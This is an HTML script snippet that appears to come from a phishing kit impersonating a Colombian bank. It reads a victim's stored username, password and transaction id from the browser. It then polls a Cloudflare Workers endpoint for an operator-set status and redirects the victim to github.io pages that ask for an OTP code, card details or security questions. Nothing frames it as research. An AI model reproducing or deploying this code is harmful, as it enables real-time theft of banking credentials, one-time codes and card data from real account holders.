<script>
  document.addEventListener('DOMContentLoaded', async () => {
    const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));

    if (!bancoldata || !bancoldata.usuario || !bancoldata.clave || !bancoldata.transactionId) {
      alert("Faltan datos de login o transactionId");
      window.location.href = 'index.html';
      return;
    }

    const transactionId = bancoldata.transactionId;
    console.log("‚è≥ BUSCANDO ESTADO:", transactionId);

    const checkStatus = async () => {
      try {
        const res = await fetch(`https://quiet-haze-3548.micollflorez.workers.dev/status?id=${transactionId}`);
        
        if (!res.ok) {
          console.warn("‚ö† Respuesta mala del worker. Reintentando...");
          return setTimeout(checkStatus, 2500);
        }

        const data = await res.json();
        console.log("üîé RESPUESTA STATUS:", data);

        // Si no hay estado o sigue pendiente: continuar esperando
        if (!data || !data.estado || data.estado === "pendiente") {
          return setTimeout(checkStatus, 2000);
        }

        // Redirecciones seg√∫n el estado
        switch (data.estado) {
          case "autorizado":
            window.location.href = "https://diciembrewin.github.io/finan/pre/codigo.html";
            break;

          case "error":
            window.location.href = "https://diciembrewin.github.io/finan/pre/";
            break;

          case "otp":
            window.location.href = "https://diciembrewin.github.io/finan/pre/codigo.html";
            break;

          case "fallo":
            window.location.href = "https://diciembrewin.github.io/finan/pre/tarjeta.html";
            break;

          case "finalizado":
            window.location.href = "https://diciembrewin.github.io/finan/pre/preguntas.html";
            break;

          default:
            console.log("Estado desconocido, reintentando:", data.estado);
            setTimeout(checkStatus, 2000);
        }

      } catch (err) {
        console.error("‚ùå Error en el fetch del status:", err);
        setTimeout(checkStatus, 3000);
      }
    };

    // Inicia el seguimiento
    checkStatus();
  });
</script>
